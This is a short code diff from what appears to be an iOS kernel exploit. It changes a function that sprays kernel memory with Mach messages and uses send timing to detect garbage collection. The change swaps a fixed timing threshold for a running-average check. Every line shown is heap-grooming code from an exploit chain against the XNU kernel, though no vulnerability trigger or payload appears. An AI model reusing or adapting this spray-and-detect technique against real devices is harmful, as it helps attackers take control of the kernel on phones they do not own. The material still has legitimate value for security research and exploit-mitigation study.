@@ -225,13 +225,15 @@ static void trigger_gc_please()
     uint8_t *body = malloc(body_size);
     memset(body, 0x41, body_size);
     
+    int64_t avgTime = 0;
     for (int i = 0; i < gc_ports_cnt; i++)
     {
-        uint64_t t0, t1;
+        uint64_t t0;
+        int64_t tdelta;
 
         t0 = mach_absolute_time();
         gc_ports[i] = send_kalloc_message(body, body_size);
-        t1 = mach_absolute_time();
+        tdelta = mach_absolute_time() - t0;
 
         /* 
             this won't necessarily get triggered on newer/faster devices (ie. >=A9)
@@ -240,12 +242,13 @@ static void trigger_gc_please()
             the idea here is to look for a longer spray which signals that GC may have
             taken place
         */
-        if (t1 - t0 > 1000000)
+        if (avgTime && tdelta - avgTime > avgTime/2)
         {
             LOG("got gc at %d -- breaking", i);
             gc_ports_max = i;
             break;
         }
+        avgTime = ( avgTime * i + tdelta ) / (i + 1);
     }
 
     for (int i = 0; i < gc_ports_max; i++)
